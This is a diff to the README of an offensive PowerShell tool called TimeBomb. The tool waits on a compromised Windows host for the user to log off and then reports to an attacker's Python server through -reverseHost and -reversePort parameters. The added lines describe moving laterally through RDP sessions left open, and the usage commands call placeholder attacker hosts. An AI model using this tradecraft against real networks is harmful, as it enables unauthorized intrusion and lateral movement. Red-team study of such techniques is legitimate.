@@ -51,20 +51,21 @@ PS> RMLog -ip 127.0.0.1 -users
 
 ## Time Bomb 
 
-TimeBomb is useful when you landed on a network host and you want to get a notification when the user is logged of and be able to use an RDP (Remote Desktop) connection. In the background function uses 4624,4647 events and search for current login users. You can create a timer without creating or editing windows schedules and leave the host untouched. You have 3 option when you create a timeBob:
+TimeBomb is useful when you landed on a network host and you want to get a notification when the user is logged of and be able to use an RDP (Remote Desktop) connection. If the user has a remote desktop with another network host and after logging out left the remote desktop open then you could move into the network from an existing forgotten RDP connection. In the background function uses 4624,4647 events and search for current login users. You can create a timer without creating or editing windows schedules and leave the host untouched. You have 3 option when you create a timeBob:
 
 1) now
 2) once
 3) trigger
 
-Tip: Give as much as possible amount of entries in -newest parameter. For example: 5000
+Tip1: Give as much as possible amount of entries in -newest parameter. For example: 5000
+Tip2: if you want to get notifications only from users who have open RDP connection before logged out the you should uncomment the line 785
 
 The task is going to run now.
 ```
 timeBomb -task now -ip 127.0.0.1 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
 ```
 
-The task is going to run one time at specific time.
+The task is going to run once at specific time.
 ```
 timeBomb -task once -at 15:00 -ip 127.0.0.1 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
 ```
